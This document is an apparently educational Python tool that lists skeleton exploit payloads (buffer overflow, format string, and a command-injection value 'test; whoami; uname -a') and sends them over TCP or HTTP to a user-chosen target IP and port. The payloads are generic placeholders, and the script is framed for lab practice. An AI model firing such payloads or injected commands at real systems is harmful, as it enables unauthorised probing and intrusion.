#!/usr/bin/env python3
"""
exploit_template.py
Usage: python3 exploit_template.py <target_ip> <port> <template_type>
Example: python3 exploit_template.py 127.0.0.1 8080 buffer_overflow

Educational Exploit Template Framework
Safe for controlled lab use only.
"""

import sys, socket, json, os

TEMPLATES = {
    "buffer_overflow": {
        "description": "Example buffer overflow exploit skeleton",
        "payload": "A" * 1024 + "B" * 4 + "C" * 4,
        "protocol": "tcp",
        "notes": "Change buffer size and EIP offset for target."
    },
    "command_injection": {
        "description": "Command injection skeleton",
        "payload": "test; whoami; uname -a",
        "protocol": "http",
        "notes": "For web-based lab targets; test in local VM only."
    },
    "format_string": {
        "description": "Format string vulnerability skeleton",
        "payload": "%x.%x.%x.%x",
        "protocol": "tcp",
        "notes": "Adjust based on vulnerable printf() input point."
    }
}

def generate_template(template_name):
    if template_name not in TEMPLATES:
        print(f"[!] Unknown template '{template_name}'")
        print("Available:", ", ".join(TEMPLATES.keys()))
        return
    tpl = TEMPLATES[template_name]
    filename = f"{template_name}.json"
    with open(filename, "w") as f:
        json.dump(tpl, f, indent=4)
    print(f"[+] Template saved: {filename}")

def run_exploit(ip, port, template_name):
    if template_name not in TEMPLATES:
        print("[!] Invalid template.")
        return
    tpl = TEMPLATES[template_name]
    payload = tpl["payload"]
    protocol = tpl["protocol"]
    print(f"[*] Running {template_name} exploit on {ip}:{port} using {protocol.upper()} protocol")

    try:
        if protocol == "tcp":
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.send(payload.encode())
            print("[+] Payload sent successfully.")
            try:
                resp = s.recv(1024)
                print("[+] Response:", resp.decode(errors="ignore"))
            except:
                print("[*] No response or connection closed.")
            s.close()
        elif protocol == "http":
            import requests
            url = f"http://{ip}:{port}/"
            r = requests.get(url, params={"q": payload}, timeout=5)
            print(f"[+] HTTP Response Code: {r.status_code}")
            print("[+] Response snippet:", r.text[:200])
        else:
            print("[!] Unknown protocol in template.")
    except Exception as e:
        print("[!] Error running exploit:", e)

def menu():
    print("Exploit Template Library")
    print("------------------------")
    print("1. List templates")
    print("2. Generate JSON template")
    print("3. Run exploit (lab)")
    print("4. Exit")

def main():
    while True:
        menu()
        choice = input("Select option: ")
        if choice == "1":
            for k,v in TEMPLATES.items():
                print(f"{k}: {v['description']}")
        elif choice == "2":
            t = input("Template name: ")
            generate_template(t)
        elif choice == "3":
            ip = input("Target IP: ")
            port = input("Port: ")
            t = input("Template: ")
            run_exploit(ip, port, t)
        elif choice == "4":
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main()
